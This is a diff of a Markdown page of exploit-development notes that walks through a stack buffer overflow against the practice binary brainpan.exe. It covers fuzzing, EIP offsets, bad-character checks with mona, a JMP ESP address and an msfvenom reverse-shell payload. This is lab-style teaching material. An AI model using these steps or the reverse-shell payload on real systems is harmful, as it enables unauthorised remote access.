@@ -5,16 +5,16 @@ draft: false
 images: []
 menu:
   docs:
-    parent: "Other"
+    parent: "Privesc"
 weight: 1
 toc: true
 content: bufferoverflow
 ---
 
-### Step 1
+### <span style="color:#d32e9d">Step 1</span>
 Find the overflow length
 
-```
+```python
 #!/usr/bin/python
 
 import socket
@@ -48,13 +48,13 @@ if __name__ == '__main__':
                         print "\n[*] No me la container bro"
                         sys.exit(1)
 ```
-### Step 2
+### <span style="color:#d32e9d">Step 2
 Find the length to hit EIP
-```
+```bash
 msf-pattern_create -l XXX
 ```
 **Note:** Change the buffer content with your pattern_create output
-```
+```python
 #!/usr/bin/python
 
 import socket
@@ -79,16 +79,16 @@ if __name__ == '__main__':
                 print "\n[*] No me la container bro"
                 sys.exit(1)
 ```
-### Step 3 
+### <span style="color:#d32e9d">Step 3 
 Find the offset 
-```
+```bash
 msf-pattern_offset -q CHARS_IN_EIP
 ```
-### Step 4
+### <span style="color:#d32e9d">Step 4
 Send extra chars to confirm if you do have control of EIP by filling it with BBBB
 
 **Note:** Change <OFFSET> with your pattern_offset output number
-```
+```python
 #!/usr/bin/python
 
 import socket
@@ -118,16 +118,16 @@ if __name__ == '__main__':
                 print "\n[*] No me la container"
                 sys.exit(1)
 ```
-### Step 5
+### <span style="color:#d32e9d">Step 5
 Now that we know we can control the ESP and made room for our shellcode, we need to remove the possibility of any bad characters.
-```
+```bash
 !mona config -set workingfolder C://Users/usuario/Desktop
 ```
 Generate chars excluding badchars with -cpb
-```
+```python
 !mona bytearray -cpb "\x00"
 ```
-```
+```python
 #!/usr/bin/python
 
 import socket
@@ -163,12 +163,12 @@ if __name__ == '__main__':
                 print "\n[*] No me la container bro"
                 sys.exit(1)
 ```
-```
+```bash
 !mona compare -f /PATH/bytearray.bin -a <ESP direction>
 ```
-### Step 6
+### <span style="color:#d32e9d">Step 6
 Find a way to jump into ESP
-```
+```python
 /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 nasm > jmp ESP
 
@@ -177,21 +177,22 @@ nasm > jmp ESP
 !mona modules
 !mona jmp -r esp -m brainpan.exe
 ```
-```
+```python
 !mona find -s "\xFF\xE4" -m "brainpan.exe"
 >> 0x311712f3
 ```
 Put it in the script like this "'\xf3\x12\x17\x31"
-### Step 7 
+### <span style="color:#d32e9d">Step 7 
 Create the shellcode
-```
+```python
 msfvenom -p windows/shell_reverse_tcp LPORT=6969 LHOST=XXX -b '\x00' -f c
 ```
 Add the shellcode and NOPs to the script
-
+```python
 NOP = "\x90"*16
-### Final Script
 ```
+### <span style="color:#d32e9d">Final Script
+```python
 #!/usr/bin/python
 
 import socket
